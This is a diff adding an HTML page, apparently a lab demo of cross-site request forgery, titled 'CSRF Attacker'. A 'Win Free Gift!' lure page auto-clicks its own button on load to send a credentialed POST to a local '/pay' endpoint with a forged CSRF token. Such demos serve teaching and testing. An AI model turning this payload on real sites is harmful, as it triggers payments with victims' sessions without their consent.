@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF Attacker</title>
+  </head>
+
+  <body>
+    <h2>🎁Win Free Gift!</h2>
+    <button class="free-gift">Get free gift.</button>
+    <script>
+      document
+        .querySelector(".free-gift")
+        .addEventListener("click", async (event) => {
+          await fetch("http://localhost:4000/pay", {
+            method: "POST",
+            credentials: "include",
+            headers: {
+              "X-CSRF-Token": "1234",
+            },
+          });
+        });
+
+      document.querySelector(".free-gift").click();
+    </script>
+  </body>
+</html>
+
+<!-- http://127.0.0.1:5500/ -->
